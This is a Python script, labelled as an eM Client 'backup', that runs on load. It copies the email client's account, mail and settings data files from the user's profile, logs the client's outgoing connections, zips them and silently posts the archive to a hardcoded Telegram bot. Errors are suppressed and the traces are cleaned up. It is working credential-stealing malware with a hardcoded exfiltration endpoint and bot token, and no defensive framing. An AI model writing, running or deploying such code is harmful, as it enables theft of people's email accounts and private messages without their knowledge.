import os
import shutil
import zipfile
import hashlib
import requests
import tempfile
import psutil
import datetime

# === CONFIGURATION ===
BOT_TOKEN = "7245404963:AAEMlPlsjsULU5uYVvUH4GxS1QSgfVh9mn0"
CHAT_ID = "513947114"
FICHIERS = ["accounts.dat", "main.dat", "settings.dat"]
NOM_ZIP = "eMClient_Backup.zip"
# ======================

def get_file_hash(filepath):
    h = hashlib.md5()
    with open(filepath, 'rb') as f:
        while chunk := f.read(8192):
            h.update(chunk)
    return h.hexdigest()

def remove_duplicates(folder_path):
    hashes = {}
    for filename in os.listdir(folder_path):
        filepath = os.path.join(folder_path, filename)
        if os.path.isfile(filepath):
            file_hash = get_file_hash(filepath)
            if file_hash in hashes:
                os.remove(filepath)
            else:
                hashes[file_hash] = filename

def detect_outgoing_connections(process_name="MailClient.exe"):
    log = []
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'] and process_name.lower() in proc.info['name'].lower():
            for conn in proc.connections(kind='inet'):
                if conn.status == 'ESTABLISHED':
                    try:
                        ip = conn.raddr.ip
                        port = conn.raddr.port
                        log.append(f"{ip}:{port}")
                    except:
                        pass
    return log

def chercher_dossier_emclient():
    base_path = os.path.expanduser("~")
    roaming_path = os.path.join(base_path, "AppData", "Roaming")
    for dossier in os.listdir(roaming_path):
        if "em client" in dossier.lower():
            return os.path.join(roaming_path, dossier)
    return None

def exporter_et_envoyer():
    try:
        emclient_path = chercher_dossier_emclient()
        if not emclient_path:
            return  # eM Client introuvable

        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, NOM_ZIP)

        # Copier les fichiers .dat
        for nom_fichier in FICHIERS:
            src = os.path.join(emclient_path, nom_fichier)
            dst = os.path.join(temp_dir, nom_fichier)
            if os.path.exists(src):
                shutil.copy2(src, dst)

        # Nettoyage des doublons
        remove_duplicates(temp_dir)

        # IPs sortantes
        ip_logs = detect_outgoing_connections()
        with open(os.path.join(temp_dir, "fuite_ip.txt"), "w") as f:
            f.write("\n".join(ip_logs) if ip_logs else "Aucune connexion sortante détectée.")

        # Créer ZIP
        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for file_name in os.listdir(temp_dir):
                if file_name != NOM_ZIP:
                    zipf.write(os.path.join(temp_dir, file_name), file_name)

        # Envoi Telegram
        with open(zip_path, "rb") as f:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": f"📦 Backup eM Client - {datetime.datetime.now().strftime('%d/%m/%Y')}"},
                files={"document": f}
            )
    except:
        pass
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

# Envoi à chaque exécution
exporter_et_envoyer()
